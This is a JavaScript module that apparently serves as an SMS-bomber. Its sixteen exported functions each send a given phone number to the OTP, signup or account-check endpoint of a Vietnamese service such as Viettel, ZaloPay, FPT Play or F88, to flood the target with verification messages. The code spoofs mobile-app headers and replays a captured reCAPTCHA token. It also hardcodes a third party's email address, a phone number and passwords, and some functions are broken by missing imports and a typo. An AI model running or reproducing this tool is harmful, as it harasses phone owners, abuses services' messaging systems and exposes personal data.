async function myviettel(number){
  const axios = require('axios'),
  data= {
    msisdn: number.toString()
  };
axios({
  url: 'https://vietteltelecom.vn/api/get-otp',
  method: 'post',
  data
}).then(resp =>{
  console.log(resp.data)
  return "true"
}).catch(err =>{
  return false
})
}
async function TV360(number){
  const axios = require('axios');
var data = {
  msisdn: number.toString()
}
axios({
  url: 'http://tv360.vn/public/v1/auth/get-otp-login',
  method: 'post',
  data
}).then(resp =>{
  console.log(resp.data)
  
}).catch(err => {
  
})
}
async function zalopay(number){
  const axios = require('axios')
var headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone12',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            },
            params = {
                'phone_number': number.toString(),
            };
axios({
  url: 'https://api.zalopay.vn/v2/account/phone/status',
  method: 'get',
  headers: headers,
  params: params
}).then(res => {
  var token = res['data']['data']['send_otp_token']
  axios({
  url: 'https://api.zalopay.vn/v2/account/otp',
  method: 'post',
  headers: headers,
  data: {
                'phone_number': number.toString(),
                'send_otp_token': token,
            }
}).then(res1 => {
    console.log(res1.data)
    
})
}).catch(err => {  })
}
async function metavn(number){
  const axios = require('axios'),
  headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'
  },
  data = {
    'api_args': {
    'lgUser': '0334819872',
    'act': 'send',
    'type': 'phone',
    },
      'api_method': 'CheckExist',
};
axios({
  url: 'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
  method: 'post',
  headers,
  data
}).then(resp =>{
  console.log(resp.data)
  
}).catch(err =>{
  
})
}
async function vion(number){
  const axios = require('axios');
var formdata = {
  'phone_number': number.toString(),
  'password': 'âbbcc',
  'platform': 'web',
  'model': 'Windows 10',
  'device_name': 'Chrome/101',
  'device_type': 'desktop',
  'ui': '012021'
}
axios({
  url: 'https://api.vieon.vn/backend/user/register/mobile?platform=web&ui=012021',
  method: 'post',
  data: new URLSearchParams(formdata)
}).then(res => {
  console.log(res.data)
  
}).catch(err => {
  
})
}
async function fpt(phone) {
const axios = require('axios'),
   data = {
     'phone': phone.toString(),
     'typeReset':'0'
   },
  headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi;q=0.8',
    'Connection': 'keep-alive',
    'Content-Length': '28',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Host': 'fptshop.com.vn',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
  };
axios({
  url: 'https://fptshop.com.vn/api-data/loyalty/Login/Verification',
  method: 'post',
  headers,
  data
}).then(resp => {
  console.log(resp.data)
})
}
async function fptplay(phone) {
  var axios = require('axios'),
  data = {
  "phone": phone.toString(), 
  "country_code": "VN",
  "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
  };
axios({
  url: "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=8VXof1DwcEuwyF_zO7PvkA&e=1681313081&device=Chrome(version%253A101.0.0.0)&drm=1",
  method: 'post',
  data,
  
}).then(resp => {
  console.log(resp.data)
})
}
function hasuki(number){
  const axios = require('axios')
  axios({
    url: 'https://hasaki.vn/ajax?api=user.verifyUserName&username=' + number.toString(),
    method: 'get'
  }).then(resp =>{
    console.log(resp)
  })
}
function popeys(number){
  var axios = require('axios'),
  headers = {
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://popeyes.vn',
    'referer': 'https://popeyes.vn/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-client': 'WebApp'
  },
  data = {
    "phone": number.toString(),
    "firstName": "Hoang",
    "lastName": "Kien",
    "email": "halizeks@gmail.com"
  };
axios({
  url: 'https://api.popeyes.vn/api/v1/register',
  method: 'post',
  headers, data
}).then(resp => {
  console.log(resp.data)
}).catch(e => {
  console.log(e)
})
}
function atm(number) {
  var axios = require('axios'),
  headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi;q=0.9',
    'content-length': '46',
    'content-type': 'application/json',
    'origin': 'https://atm-online.vn',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
  },
  data = {
    "mobilePhone": number.toString(),
    "source": "ONLINE"
  };
axios({
  url: 'https://atm-online.vn/back-office/api/json/auth/sendAcceptanceCode',
  method: 'post',
  headers, data
}).then(resp => {
  console.log(resp.data)
})
}
function mochalazi(number){
  const axios = require('axios'),
  data = {
    countryCode: "84",
    phoneNumber: number.toString()
  }
axios({
  url: 'https://mocha.lozi.vn/v1/invites/use-app',
  method: 'post',
  data
}).then(resp => {
  console.log(resp)
})
}
function interloan(number){
  const axios = require('axios')
  axios.post("https://backend.interloan.tech/api/v1/users/phone_check", {
            phone: number.toString(),
            user_type: "borrower",
          })
          .then((resp) => {
            console.log(resp)

          })
}
function winmart(number){
  const axios = require('axios')
  axios.get(
            "https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=" +
              number.toString()
          )
          .then((resp) => {
            console.log(resp)
          })
}
function pharmacity(number){
  const axios = require('axios')
  axios.post("https://api-gateway.pharmacity.vn/customers/register/otp", {
            phone: number.toString(),
            referral: "",
          }).then((resp) => {
            console.log(resp)
          })
}
function gosell(phone){
  axios
          .post("https://api.beecow.com/api/register/gosell", {
            password: "7749Truong.",
            displayName: "",
            locationCode: "VN-SG",
            langKey: "vi",
            mobile: {
              countryCode: "+84",
              phoneNumber: phone.toString(),
            },
          })
  .then((resp) => {
            console.log(resp)
          })
}
function gapo(phone){
  axios
          .post("https://api.gapo.vn/auth/v2.0/signup", {
            device_id: "02d0db76-9cd9-49a0-9456-0e374dfb0c21",
            phone_number: "+84-" + phoneto.String(),
            otp_type: 0,
          }).then((resp) => {
            console.log(resp)
          })
}
function f88(number){
  const axios = require('axios'),
  headers={"Host": "api.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"},
  data = {
    phoneNumber: number.toString(),
recaptchaResponse: "03AKH6MRGETJqRxQjNsEopTQ5aKVDyBPYI2YBd6aJXCCKe_X0cM7UYaDU4gHCquF0VFGHb26CVhQdLyNJFkuD3JvJbKDgMBoTTGLG9lY71LKUwwYO4G1UxMx7oUGF6ImmE1gQTUFjEyW488rHvGEPUmCip0Y2laolYL0gFeGFdrOxFfFDf6iphqwg6jsSK3bnK2ZxDw7vsKf0fjPVkd-Q2un_jRnEOqSDO3h6bhN9YVvE3-lLwLrb9IYLKMhEf59FNYf8qLnA8BM2vFXUEZfu5Ghi7qFzwbYIqVJCFpvA-TTcC7NnzuWm0u2-9cy0EAG-01WxiCKtrHaLQ2z2_pTByu_XNKN5ma86srG7EpUpeEmnNHIBEw0eeHiSG93pJOzSQbV2UkltEm7Fkcg53jcnVkGUKgsXgvp63YEcRLPmx6G44pYtC_xz4TUImH1IMCgPhR-jgKbtp6_tOpqqCsnCkUdez0nbWyhUSWdXHoqzyfXMn8sV7LCy5cLxm3z0lAz9m8EeMmfusRcbF",
source: "Online"
  };
axios({
  url: 'https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP',
  method: 'post',
  data, headers
}).then(resp => {
  console.log(resp.data)
})
}
module.exports = {
  metavn,
  zalopay,
  myviettel,
  TV360,
  vion,
  fpt,
  fptplay,
  hasuki,
  popeys,
  atm,
  interloan,
  winmart,
  pharmacity,
  gosell,
  gapo,
  f88
}